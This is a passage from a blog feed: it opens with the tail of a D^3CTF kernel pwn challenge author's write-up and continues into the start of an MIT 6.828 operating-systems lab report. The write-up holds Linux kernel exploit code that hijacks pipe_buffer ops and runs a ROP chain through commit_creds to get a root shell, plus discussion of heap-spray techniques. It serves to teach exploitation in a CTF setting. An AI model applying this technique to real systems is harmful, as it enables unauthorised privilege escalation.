&#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] kernel base: \033[0m%llx \033[32m\033[1moffset: \033[0m%llx\n&quot;</span>, </span><br><span class="line">            kernel_base, kernel_offset);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * Step.V</span></span><br><span class="line"><span class="comment">     * hijack the ops of pipe_buffer</span></span><br><span class="line"><span class="comment">     * free all pipe to trigger fake ptr</span></span><br><span class="line"><span class="comment">     * so that we hijack the RIP</span></span><br><span class="line"><span class="comment">     * construct a ROP on pipe_buffer</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\n\033[34m\033[1m[*] Step.V hijack the ops of pipe_buffer, gain root privilege\033[0m&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] pre-construct data in userspace...&quot;</span>);</span><br><span class="line">    pipe_buf_ptr = (<span class="keyword">struct</span> pipe_buffer *) fake_secondary_msg;</span><br><span class="line">    pipe_buf_ptr-&gt;page = *(<span class="type">uint64_t</span>*) <span class="string">&quot;arttnba3&quot;</span>;</span><br><span class="line">    pipe_buf_ptr-&gt;ops = victim_addr + <span class="number">0x100</span>;</span><br><span class="line"></span><br><span class="line">    ops_ptr = (<span class="keyword">struct</span> pipe_buf_operations *) &amp;fake_secondary_msg[<span class="number">0x100</span>];</span><br><span class="line">    ops_ptr-&gt;release = PUSH_RSI_POP_RSP_POP_4VAL_RET + kernel_offset;</span><br><span class="line"></span><br><span class="line">    rop_idx = <span class="number">0</span>;</span><br><span class="line">    rop_chain = (<span class="type">uint64_t</span>*) &amp;fake_secondary_msg[<span class="number">0x20</span>];</span><br><span class="line">    rop_chain[rop_idx++] = kernel_offset + POP_RDI_RET;</span><br><span class="line">    rop_chain[rop_idx++] = kernel_offset + INIT_CRED;</span><br><span class="line">    rop_chain[rop_idx++] = kernel_offset + COMMIT_CREDS;</span><br><span class="line">    rop_chain[rop_idx++] = kernel_offset + SWAPGS_RESTORE_REGS_AND_RETURN_TO_USERMODE + <span class="number">22</span>;</span><br><span class="line">    rop_chain[rop_idx++] = *(<span class="type">uint64_t</span>*) <span class="string">&quot;arttnba3&quot;</span>;</span><br><span class="line">    rop_chain[rop_idx++] = *(<span class="type">uint64_t</span>*) <span class="string">&quot;arttnba3&quot;</span>;</span><br><span class="line">    rop_chain[rop_idx++] = getRootShell;</span><br><span class="line">    rop_chain[rop_idx++] = user_cs;</span><br><span class="line">    rop_chain[rop_idx++] = user_rflags;</span><br><span class="line">    rop_chain[rop_idx++] = user_sp;</span><br><span class="line">    rop_chain[rop_idx++] = user_ss;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] spray sk_buff to hijack pipe_buffer...&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (spraySkBuff(sk_sockets, fake_secondary_msg, </span><br><span class="line">            <span class="keyword">sizeof</span>(fake_secondary_msg)) &lt; <span class="number">0</span>)</span><br><span class="line">        errExit(<span class="string">&quot;failed to spray sk_buff!&quot;</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// for gdb attach only</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] gadget: %p\n&quot;</span>, kernel_offset + PUSH_RSI_POP_RSP_POP_4VAL_RET);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] free_pipe_info: %p\n&quot;</span>, kernel_offset + FREE_PIPE_INFO);</span><br><span class="line">    sleep(<span class="number">5</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] trigger fake ops-&gt;release to hijack RIP...&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; PIPE_NUM; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        close(pipe_fd[i][<span class="number">0</span>]);</span><br><span class="line">        close(pipe_fd[i][<span class="number">1</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行即可完成提权，成功率比笔者最初拍脑门想的解法要高得多XD</p><p><img src="https://s2.loli.net/2022/05/17/vZhdoFP5TgRc9Ul.png" alt="image.png"></p><h1 id="0x03-其他的预期解"><a href="#0x03-其他的预期解" class="headerlink" title="0x03.其他的预期解"></a>0x03.其他的预期解</h1><p>除了笔者的官方解法以外，笔者认为以下方法应当也能解开本题（笔者未进行尝试）：</p><ul><li>由于整个文件系统是直接在内存中的，因此可以直接搜索内存寻找 flag（笔者本人并不推荐这种专注于 flag 本身的解法）</li><li>直接分配其他可以劫持 RIP 的结构体，然后爆破内核 .text 段偏移，在 pt_regs 上构造 ROP</li><li>slub 大师通过巧妙构造泄露出 cookie 与堆上地址，然后劫持 freelist（笔者有思路但笔者认为这种解法过于麻烦 + 没有必要）<ul><li>泄露出内核基址后后写一些全局指针（例如 <code>n_tty_ops</code>）</li><li>利用 prctl 修改 current_task 的 comm 成员，暴力搜索内存找到 cred</li></ul></li><li>将 double free 应用到其他的结构体上，使其转换为一个已知的 CVE 后直接打</li><li>利用 0day 或是（笔者不知道的） 1day 直接打 kernel</li></ul><h1 id="0x04-解题情况与非预期"><a href="#0x04-解题情况与非预期" class="headerlink" title="0x04.解题情况与非预期"></a>0x04.解题情况与非预期</h1><p>这一次的 D^3CTF 中笔者的题是第二批放出的，但在笔者放出题目后不久便被 W&amp;M 战队拿下了一血，而整个比赛中解出了这道题目的队伍也达到了 8 支之多，笔者原以为是自身出题水准不足以至于出的题目只有签到题水平于是被各大战队秒杀（虽然笔者本身就很菜），但事情往往没有笔者所想的那么简单</p><p>在比赛结束时，我们发放了一份调查问卷，而笔者在其中看到了一条对笔者题目的评价——</p><p><img src="https://s2.loli.net/2022/03/08/64O12YCIPXuj35t.png" alt="image.png"></p><p>笔者在看到这条消息之后整个大脑一片空白，马上从比赛平台上下载下来题目附件，解压，果然在 <code>/tmp</code> 目录下看到了一个熟悉的 <code>exp</code> 文件…</p><p><img src="https://s2.loli.net/2022/03/08/gartTlFBis2xALv.png" alt="image.png"></p><p>赛后笔者查阅选手们的 wp，<strong>确乎是有一半的队伍利用笔者留下来的 exp 解出了这道题</strong>，这也令这道题的做题体验大打折扣，在这里笔者向大家献上最诚挚的歉意🙇🏽‍♂️🙇🏽‍♂️🙇🏽‍♂️！！！</p><p>不过比较幸运的一点是笔者本地测试时是直接在根目录下测试的，因此 setxattr 的第一个参数是 <code>/exp</code>，而对于远程环境而言根目录对选手是不可写的，选手的 exp 路径应当为 <code>/tmp/exp</code>，这也让这个 exp 无法被直接打通（否则可能解题队伍数量还得翻个数十倍…），不过选手仍可以逆向出 exp 逻辑后进行修改</p><p>wp 中只有四支队伍是正常做题的，解法基本上都是预期解——使用 <code>msg_msg</code> 泄露信息与 <code>pipe_buffer</code> 劫持 RIP，不过都比笔者这个笨拙的解法要优秀上许多（笑），基本上可以归为两种题解：</p><ul><li>喷射 pipe_buffer 与 sk_buff，参照 CVE-2021-22555 的解法完成解题（3支队伍）</li><li>喷射大量 pipe_buffer 后直接用 setxattr 修改 msg_msg 越界读泄露出 kernel base，修改 msg_msg-&gt;next 到 <code>vmemmap_base</code> 前 8 字节（刚好为 NULL），这个地方存放了几个全局变量（指向 <code>vmemmap_base</code>、<code>vmalloc_base</code>、<code>page_offset_base</code> 的指针等都在这里），读出“堆基址”后用一个堆上地址修复 msg_msg 的 header，然后劫持 pipe_buffer。这个解法和笔者的解法基本上是一样的</li></ul><p>笔者在出题过程中其实也看到了 CVE-2021-22555，这个漏洞本身是一个 off-by-null，最后转化为一个 UAF 进行利用，因此与笔者的这道题最终是可以殊途同归的，事实证明正常解题的队伍基本上都参照了这个漏洞（笑），不过笔者还是希望能够探索出一条别的道路，所以你在上面看到的笔者的解法其实与这个漏洞的利用过程并非是完全一样的</p><blockquote><p>外国友人对本题的评价：</p><blockquote><p>This is a standard kernel pwn challenge. We are given an unprivileged shell in a Linux VM, and the flag can only be read by root. The VM loads a vulnerable kernel module, which we have to exploit to gain root privileges and read the flag.</p></blockquote><p>说实话这一次出题确实还是比较常规，希望笔者明年能够想到一些更好的东西XD</p></blockquote><h1 id="0x05-总结与反思"><a href="#0x05-总结与反思" class="headerlink" title="0x05.总结与反思"></a>0x05.总结与反思</h1><p>虽然在官方解法中使用了“看似非常通用的解法”解出了这道题，但笔者其实是不太满意的：</p><ul><li>该方法仅适用于较大的 object，对于小一点的 object 或者 kmem_cache-&gt;offset 为 0 的情况则<strong>很容易让我们无法修复 msg_msg，甚至就无法分配 msg_msg</strong> （小于 0x30 的情况）</li><li>在劫持 RIP 的过程当中<strong>仍然需要根据 object 大小去找对应的可用结构体</strong>，而没有一个更加<strong>通用</strong>的劫持控制流的办法，这无疑造成了相当程度的限制</li><li>对于独立的 kmem_cache 而言<strong>无法使用该方法进行利用</strong>，因为此时 msg_msg 不从该处分配</li><li><strong>真实环境中在进行内存分配的并非只有我们</strong>，很容易被其他进程拿到 freelist 造成 kernel panic</li><li>这个方法似乎并不能在泛 Linux 平台上通用（据悉 Android 并不能使用这一套 IPC API，笔者尚未查证）</li></ul><p>因此笔者认为这道题目充其量能在 D3CTF 这一档次的比赛中充当签到题，但笔者还是希望笔者对“通解”的探索能够给大家带来一些新的思考（笑）</p><p>在出题过程当中还遇到了这样的问题，原因暂且不明，也希望了解其细节的大师傅不吝赐教：</p><ul><li>笔者惯用的手法是利用 <code>pt_regs</code> 结构体构造 ROP，控制栈迁移到此处，但是在本题中<strong>每次劫持 RIP 时内核栈顶到栈底的相对偏移都并非一固定值</strong>，因此笔者只好用传统的堆上 ROP 方式，笔者暂且不清楚是什么原因造成了<strong>偏移值不固定</strong>的情况的出现</li><li>对于 5.14 及往上版本的内核，<strong>setxattr 与 msgsnd 不会从同一张 slub 上取 object</strong>（一个是 <code>GFP_KERNEL_ACCOUNT</code> 而另一个是 <code>GPF_KERNEL</code>，但这两个 flag 在之前的版本中似乎并不会造成 slub 的隔离），但笔者尚未发现 5.14 内核中 slub 涉及的源码的相关改动（笔者仅粗略检索了源码）</li></ul>]]></content>
    
    
    <summary type="html">&lt;p&gt;听说 sb 出题人把 exp 也给打包发布了，比赛结束才发现&lt;/p&gt;</summary>
    
    
    
    <category term="CTF" scheme="http://blog.arttnba3.cn/categories/CTF/"/>
    
    
    <category term="Pwn" scheme="http://blog.arttnba3.cn/tags/Pwn/"/>
    
    <category term="信息安全" scheme="http://blog.arttnba3.cn/tags/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/"/>
    
    <category term="CTF" scheme="http://blog.arttnba3.cn/tags/CTF/"/>
    
    <category term="Use After Free" scheme="http://blog.arttnba3.cn/tags/Use-After-Free/"/>
    
    <category term="Linux" scheme="http://blog.arttnba3.cn/tags/Linux/"/>
    
    <category term="Linux Kernel" scheme="http://blog.arttnba3.cn/tags/Linux-Kernel/"/>
    
    <category term="Kernel UAF" scheme="http://blog.arttnba3.cn/tags/Kernel-UAF/"/>
    
    <category term="D^3CTF" scheme="http://blog.arttnba3.cn/tags/D-3CTF/"/>
    
  </entry>
  
  <entry>
    <title>【EXPR.0x00】MIT 6.828 课程实验报告</title>
    <link href="http://blog.arttnba3.cn/2022/02/21/EXPR-0X00-MIT_6_828/"/>
    <id>http://blog.arttnba3.cn/2022/02/21/EXPR-0X00-MIT_6_828/</id>
    <published>2022-02-20T18:57:25.000Z</published>
    <updated>2022-08-18T17:46:06.850Z</updated>
    
    <content type="html"><![CDATA[<p>不如 Windows XP 好用</p><span id="more"></span><h1 id="0x00-一切开始之前"><a href="#0x00-一切开始之前" class="headerlink" title="0x00.一切开始之前"></a>0x00.一切开始之前</h1><blockquote><p>为什么要写这篇博客？参见 <a href="https://arttnba3.cn/2022/03/18/PIECES-0X03-SHELL_OUTSIDE-3-IDEALIST_DEATH/">https://arttnba3.cn/2022/03/18/PIECES-0X03-SHELL_OUTSIDE-3-IDEALIST_DEATH&#x2F;</a></p></blockquote><p>MIT 6.828 是十分著名的一个综合性的操作系统实验课程，由麻省理工大学（MIT）开设，一共有 6 个 lab，基于 XV6——一个为OS课程教学而开发的 OS kernel，手把手带你一步步补全一个操作系统内核。笔者认为这是十分优秀且富有完成价值的一个 OS 实验，因此笔者决定趁大三寒假实习的空闲时间将本课程补完。</p><p>笔者选用其 2018 年的实验课程，因为自从 2019 起他们转向了 RISC-V，而笔者暂时不想离开 X86 的舒适区（笑），因为本次实验的主要目的还是学习操作系统，笔者不想在学习其他架构上花费太多时间</p><h2 id="PRE-环境搭建"><a href="#PRE-环境搭建" class="headerlink" title="PRE.环境搭建"></a>PRE.环境搭建</h2><blockquote><p>参见 <a href="https://pdos.csail.mit.edu/6.828/2018/tools.html">https://pdos.csail.mit.edu/6.828/2018/tools.html</a></p><h1 id="Tools-Used-in-6-828"><a href="#Tools-Used-in-6-828" class="headerlink" title="Tools Used in 6.828"></a>Tools Used in 6.828</h1><p>You’ll use two sets of tools in this class: an x86 emulator, <a href="https://pdos.csail.mit.edu/6.828/2018/tools.html#qemu">QEMU</a>, for running your kernel; and a <a href="https://pdos.csail.mit.edu/6.828/2018/tools.html#chain">compiler toolchain</a>, including assembler, linker, C compiler, and debugger, for compiling and testing your kernel. This page has the information you’ll need to download and install your own copies. This class assumes familiarity with Unix commands throughout.</p><p>We highly recommend using a Debathena machine, such as athena.dialup.mit.edu, to work on the labs. If you use the MIT Athena machines that run Linux, then all the software tools you will need for this course are located in the 6.828 locker: just type ‘add -f 6.828’ to get access to them.</p><p>If you don’t have access to a Debathena machine, we recommend you use a virtual machine with Linux. If you really want to, you can build and install the tools on your own machine. We have instructions below for Linux and MacOS computers.</p><p>It should be possible to get this development environment running under windows with the help of <a href="http://www.cygwin.com/">Cygwin</a>. Install cygwin, and be sure to install the flex and bison packages (they are under the development header).</p><p>For an overview of useful commands in the tools used in 6.828, see the <a href="https://pdos.csail.mit.edu/6.828/2018/labguide.html">lab tools guide</a>.</p></blockquote><p>为了开始本次实验，我们主要需要这两样东西：</p><ul><li><p>一个 x86 模拟器：QEMU——用以运行内核</p></li><li><p>一套编译工具，包括汇编器、链接器、C 编译器、调试器——用以编译与测试内核</p></li></ul><h3 id="Compiler-Toolchain"><a href="#Compiler-Toolchain" class="headerlink" title="Compiler Toolchain"></a>Compiler Toolchain</h3><p>为了完成本次实验，笔者用了一个近乎全新的 Ubuntu 21.10，按课程页面进行如下操作：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo apt-get install -y build-essential gdb</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo apt-get install gcc-multilib</span><br></code></pre></td></tr></table></figure><p>检查，出现类似下面的输出说明安装成功</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">gcc -m32 -print-libgcc-file-name</span><br>/usr/lib/gcc/x86_64-linux-gnu/8/32/libgcc.a<br></code></pre></td></tr></table></figure><h3 id="QEMU-Emulator"><a href="#QEMU-Emulator" class="headerlink" title="QEMU Emulator"></a>QEMU Emulator</h3><p>为了更好地进行实验，MIT 6.828 课程的教师们将 qemu 进行了一定的改造，因此我们需要手动编译安装 patch 后的 QEMU</p><p>首先补充安装一些库：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo apt install libsdl1.2-dev libtool-bin libglib2.0-dev libz-dev libpixman-1-dev</span><br></code></pre></td></tr></table></figure><p>从 GitHub 拉源码：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">git <span class="hljs-built_in">clone</span> https://github.com/mit-pdos/6.828-qemu.git qemu</span><br></code></pre></td></tr></table></figure><p>在源码目录下进行需要的配置，<code>[]</code> 里的是可选项（输入命令时不带这个框）</p><ul><li><p><code>--prefix=PFX</code>：指定安装 qemu 的目录，若未指定则默认为 <code>/usr/local</code></p></li><li><p><code>--target-list=&quot;i386-softmmu x86_64-softmmu</code>：精简化要安装的架构</p></li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">./configure --disable-kvm --disable-werror [--prefix=PFX] [--target-list=<span class="hljs-string">&quot;i386-softmmu x86_64-softmmu&quot;</span>]</span><br></code></pre></td></tr></table></figure><p>最后编译就完事了</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">make</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo make install</span><br></code></pre></td></tr></table></figure><blockquote><h3 id="可能出现的错误"><a href="#可能出现的错误" class="headerlink" title="可能出现的错误"></a>可能出现的错误</h3><p>笔者在编译 qemu 时遇到了这样的错误：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs shell">...<br>  CC    stubs/qmp_pc_dimm_device_list.o<br>  AR    libqemustub.a<br>  LINK  qemu-ga<br>/usr/bin/ld: qga/commands-posix.o: in function `dev_major_minor&#x27;:<br>/home/arttnba3/Desktop/MIT_6.828/qqemu/qga/commands-posix.c:633: undefined reference to `major&#x27;<br>/usr/bin/ld: /home/arttnba3/Desktop/MIT_6.828/qqemu/qga/commands-posix.c:634: undefined reference to `minor&#x27;<br>collect2: error: ld returned 1 exit status<br>make: *** [Makefile:288: qemu-ga] Error 1<br></code></pre></td></tr></table></figure><p>参照 <a href="http://patchwork.ozlabs.org/patch/709415/">[v3] build: include sys&#x2F;sysmacros.h for major() and minor() - Patchwork</a> ，在 qemu 源码目录下的 <code>qga/commands-posix.c</code> 加上一个 <code>#include &lt;sys/sysmacros.h&gt;</code></p><p>继续 make install，之后还可能出现这样一个错误：</p><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs gradle">...<br>  Building optionrom/kvmvapic.img<br>  Building optionrom/kvmvapic.raw<br>  Signing optionrom/kvmvapic.bin<br>install -d -m <span class="hljs-number">0755</span> <span class="hljs-string">&quot;/usr/local/share/qemu&quot;</span><br>install: cannot change permissions of ‘<span class="hljs-regexp">/usr/</span>local<span class="hljs-regexp">/share/</span>qemu’: No such <span class="hljs-keyword">file</span> or directory<br>make: *** [Makefile:<span class="hljs-number">382</span>: install-datadir] Error <span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><p>我们手动创建 <code>/usr/local/share/qemu</code> 这个目录即可</p><p>之后继续 make install，又报缺一个目录的错误（不能一次报完嘛 - - ）</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs shell">install -d -m 0755 &quot;/usr/local/share/qemu&quot;<br>install -d -m 0755 &quot;/usr/local/etc/qemu&quot;<br>install: cannot change permissions of ‘/usr/local/etc/qemu’: No such file or directory<br>make: *** [Makefile:392: install-confdir] Error 1<br></code></pre></td></tr></table></figure><p>依旧手动创建之，然后 make install，这里需要注意我们应当以 root 权限执行</p></blockquote><h1 id="0x01-Lab-1-Booting-a-PC"><a href="#0x01-Lab-1-Booting-a-PC" class="headerlink" title="0x01.Lab 1: Booting a PC"></a>0x01.Lab 1: Booting a PC</h1><blockquote><p>lab 页面： <a href="https://pdos.csail.mit.edu/6.828/2018/labs/lab1/%5D">[https://pdos.csail.mit.edu/6.828/2018/labs/lab1/]</a>(<a href="https://pdos.csail.mit.edu/6.828/2018/labs/lab1/">Lab 1: PC Bootstrap and GCC Calling Conventions</a>)</p></blockquote><blockquote><p>该 lab 大量内容与 <a href="https://arttnba3.cn/2021/06/24/CODE-0X00-A3OS/">【CODE.0x00】从零开始的32位操作系统开发手记 - arttnba3’s blog</a>重复，<strong>相关知识笔者于本篇博客中仅做简述，不再重复摘抄，如有需要请自行阅读笔者的这篇博客</strong></p></blockquote><p>该 lab 总共三个部分：</p><ul><li><p>熟悉 x86 汇编语言、QEMU x86 模拟器、PC的开机引导流程</p></li><li><p>测试我们用于引导内核的 boot loader（xv6源码下 <code>boot</code> 目录）</p></li><li><p>深入研究 6.828 内核的初始模板（JOS）</p></li></ul><p>在开始实验之前我们首先把 xv6 源码拉到本地：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">git <span class="hljs-built_in">clone</span> https://pdos.csail.mit.edu/6.828/2018/jos.git lab</span><br></code></pre></td></tr></table></figure><p>对于 MIT 的学生来说需要将实验过程 <code>make handin</code> 之后提交到对应的仓库，不过笔者只是大洋彼岸旁听的（笑）所以这一步就跳过了</p><h2 id="Part-1-PC-Bootstrap"><a href="#Part-1-PC-Bootstrap" class="headerlink" title="Part 1: PC Bootstrap"></a>Part 1: PC Bootstrap</h2><p>这一部分的主要目的是让学生熟悉<strong>一个计算机是如何启动的</strong>，通电——载入 BIOS——BIOS载入 MBR——跳转到 MBR——（载入 loader）——载入内核</p><blockquote><p>参见笔者的<a href="https://arttnba3.cn/2021/06/24/CODE-0X00-A3OS/">这篇博客</a></p></blockquote><h3 id="Getting-Started-with-x86-assembly"><a href="#Getting-Started-with-x86-assembly" class="headerlink" title="Getting Started with x86 assembly"></a>Getting Started with x86 assembly</h3><p>MIT 为那些不熟悉 x86 汇编语言的人准备了 <a href="https://pdos.csail.mit.edu/6.828/2018/readings/pcasm-book.pdf">PC Assembly Language Book</a>，接下来我们来看 Exercise1：</p><blockquote><p>Exercise 1. Familiarize yourself with the assembly language materials available on <a href="https://pdos.csail.mit.edu/6.828/2018/reference.html">the 6.828 reference page</a>. You don’t have to read them now, but you’ll almost certainly want to refer to some of this material when reading and writing x86 assembly.</p><p>We do recommend reading the section “The Syntax” in <a href="http://www.delorie.com/djgpp/doc/brennan/brennan_att_inline_djgpp.html">Brennan’s Guide to Inline Assembly</a>. It gives a good (and quite brief) description of the AT&amp;T assembly syntax we’ll be using with the GNU assembler in JOS.</p></blockquote><p>这一部分主要就是熟悉 x86 汇编语言，笔者在高中的时候就已经会了故这里直接跳过（笑），不过其推荐的材料还是值得一读的。</p><p>比较令笔者不适的是实验中涉及到的汇编代码都是丑陋的 AT&amp;T 语法而并非优美的 x86 语法（恼）</p><h3 id="Simulating-the-x86"><a href="#Simulating-the-x86" class="headerlink" title="Simulating the x86"></a>Simulating the x86</h3><p>这一步我们开始编译 JOS（xv6）并尝试使用 qemu 运行，在刚刚 clone 下来的源码目录下进行：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">make</span><br>+ as kern/entry.S<br>+ cc kern/entrypgdir.c<br>+ cc kern/init.c<br>+ cc kern/console.c<br>+ cc kern/monitor.c<br>+ cc kern/printf.c<br>+ cc kern/kdebug.c<br>+ cc lib/printfmt.c<br>+ cc lib/readline.c<br>+ cc lib/string.c<br>+ ld obj/kern/kernel<br>ld: warning: section `.bss&#x27; type changed to PROGBITS<br>+ as boot/boot.S<br>+ cc -Os boot/main.c<br>+ ld boot/boot<br>boot block is 412 bytes (max 510)<br>+ mk obj/kern/kernel.img<br></code></pre></td></tr></table></figure><p>其会生成一个磁盘镜像文件</p><p>接下来启动 qemu，MIT 在其提供的 Makefile 文件中写好了启动的代码：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">make qemu</span><br></code></pre></td></tr></table></figure><p>启动界面如下，这两个界面都可以进行输入，还是十分方便的：</p><p><img src="https://s2.loli.net/2022/02/20/FCqAQm85o3OUzKH.png" alt="imagepng"></p><p>在最初时 JOS 只提供了两个命令：<code>help</code> 和 <code>kerninfo</code>，<strong>补完剩下的功能让其成为一个完整的内核便是我们在后面几个 lab 中要做的事情</strong> <img src="https://s2.loli.net/2022/02/20/RmXtkdYnL7HGCK5.png" alt="imagepng"></p><h3 id="The-PC’s-Physical-Address-Space"><a href="#The-PC’s-Physical-Address-Space" class="headerlink" title="The PC’s Physical Address Space"></a>The PC’s Physical Address Space</h3><p>一台 PC 的物理地址通常遵循如下布局（32位下）：</p><figure class="highlight mercury"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs mercury">+------------------+  &lt;- <span class="hljs-number">0</span>xFFFFFFFF (<span class="hljs-number">4</span>GB)<br>|      <span class="hljs-number">32</span>-bit      |<br>|  memory mapped   |<br>|     devices      |<br>|                  |<br><span class="hljs-built_in">/\</span><span class="hljs-built_in">/\</span><span class="hljs-built_in">/\</span><span class="hljs-built_in">/\</span><span class="hljs-built_in">/\</span><span class="hljs-built_in">/\</span><span class="hljs-built_in">/\</span><span class="hljs-built_in">/\</span><span class="hljs-built_in">/\</span><span class="hljs-built_in">/\</span><br><br><span class="hljs-built_in">/\</span><span class="hljs-built_in">/\</span><span class="hljs-built_in">/\</span><span class="hljs-built_in">/\</span><span class="hljs-built_in">/\</span><span class="hljs-built_in">/\</span><span class="hljs-built_in">/\</span><span class="hljs-built_in">/\</span><span class="hljs-built_in">/\</span><span class="hljs-built_in">/\</span><br>|                  |<br>|      Unused      |<br>|                  |<br>+------------------+  &lt;- depends on amount of RAM<br>|                  |<br>|                  |<br>| Extended Memory  |<br>|                  |<br>|                  |<br>+------------------+  &lt;- <span class="hljs-number">0</span>x00100000 (<span class="hljs-number">1</span>MB)<br>|     BIOS ROM     |<br>+------------------+  &lt;- <span class="hljs-number">0</span>x000F0000 (<span class="hljs-number">960</span>KB)<br>|  <span class="hljs-number">16</span>-bit devices, |<br>|  expansion ROMs  |<br>+------------------+  &lt;- <span class="hljs-number">0</span>x000C0000 (<span class="hljs-number">768</span>KB)<br>|   VGA Display    |<br>+------------------+  &lt;- <span class="hljs-number">0</span>x000A0000 (<span class="hljs-number">640</span>KB)<br>|                  |<br>|    Low Memory    |<br>|                  |<br>+------------------+  &lt;- <span class="hljs-number">0</span>x00000000<br></code></pre></td></tr></table></figure><blockquote><p>关于前面这 1MB 的具体内存布局，可以参见 <a href="https://arttnba3.cn/2021/06/24/CODE-0X00-A3OS/#%E4%B8%80%E3%80%81%E5%AE%9E%E6%A8%A1%E5%BC%8F%E4%B8%8B%E7%9A%84%E5%86%85%E5%AD%98%E5%B8%83%E5%B1%80">【CODE.0x00】从零开始的32位操作系统开发手记 - arttnba3’s blog</a></p></blockquote><h3 id="The-ROM-BIOS"><a href="#The-ROM-BIOS" class="headerlink" title="The ROM BIOS"></a>The ROM BIOS</h3><p>在这部分实验中我们将使用 gdb 来调试 qemu，MIT 同样在 Makefile 中编写好了相应的命令行，我们只需要在第一个终端界面中执行：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">make qemu-gdb</span><br></code></pre></td></tr></table></figure><p>其会启动一个等待 gdb 连接 的qemu</p><p><img src="https://s2.loli.net/2022/02/20/rdO63wCxPUovYsN.png" alt="imagepng"></p><p>接下来在第二个终端中执行：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">make gdb</span><br></code></pre></td></tr></table></figure><p>其会启动 gdb 并自动连接上 qemu，这里我们可以看到 <code>CS:IP</code> 为 <code>0xf000:0xfff0</code>，即此时执行的代码地址为 <code>0xffff0</code> ，其实就是 <strong>BIOS 的入口点</strong></p><p><img 